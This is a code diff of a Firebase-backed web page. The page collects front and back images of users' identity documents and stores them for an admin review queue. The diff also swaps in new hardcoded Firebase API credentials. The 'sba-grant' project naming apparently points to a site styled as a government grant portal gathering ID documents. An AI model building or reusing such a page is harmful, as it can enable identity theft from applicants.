@@ -126,13 +126,14 @@
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { getFirestore, doc, getDoc, updateDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
+        // SYNCED CONFIG
         const firebaseConfig = {
-            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
-            authDomain: "sba-grant-2026.firebaseapp.com",
-            projectId: "sba-grant-2026",
-            storageBucket: "sba-grant-2026.firebasestorage.app",
-            messagingSenderId: "838430821326",
-            appId: "1:838430821326:web:6438deacb334076a64f99f"
+            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
+            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
+            projectId: "sba-portal-2026-f1253",
+            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
+            messagingSenderId: "363290267220",
+            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -147,13 +148,10 @@
             const userSnap = await getDoc(doc(db, "users", user.uid));
             userProfile = userSnap.data() || {};
             
-            // Normalize status to uppercase for reliable checking
             const kStatus = (userProfile.kycStatus || "NOT STARTED").toUpperCase();
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('form-container').style.display = 'block';
 
-            // ONLY block them if status is strictly PENDING. 
-            // If it is REJECTED, this IF is ignored and they see the form.
             if (kStatus === "PENDING") {
                 document.getElementById('kyc-content').innerHTML = `
                     <div style="background: white; padding: 40px 20px; border-radius: 15px; text-align: center; border-top: 5px solid #f59e0b; box-shadow: 0 10px 25px rgba(0,0,0,0.1);">
@@ -190,6 +188,7 @@
                 img.src = e.target.result;
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
+                    // Resize to save Firestore space while keeping quality
                     const scale = Math.min(800 / img.width, 800 / img.height);
                     canvas.width = img.width * scale;
                     canvas.height = img.height * scale;
@@ -228,7 +227,7 @@
                 const fData = await processImg(front);
                 const bData = await processImg(back);
 
-                // Send to Admin Panel
+                // Send request to Admin Panel
                 await addDoc(collection(db, "requests"), {
                     userId: auth.currentUser.uid,
                     userName: userProfile.fullName || "Applicant",
@@ -242,7 +241,7 @@
                     timestamp: serverTimestamp()
                 });
 
-                // Update User Status immediately
+                // Set user status to PENDING so they are locked out until review
                 await updateDoc(doc(db, "users", auth.currentUser.uid), {
                     kycStatus: "PENDING",
                     status: "PENDING AUDIT"
@@ -252,7 +251,7 @@
                 window.location.href = 'dashboard.html';
             } catch (err) {
                 console.error(err);
-                alert("NETWORK ERROR: Data not transmitted. Please try again.");
+                alert("NETWORK ERROR: Transmission failed.");
                 uploadBtn.disabled = false;
                 uploadBtn.innerText = "Transmit Documents";
             }
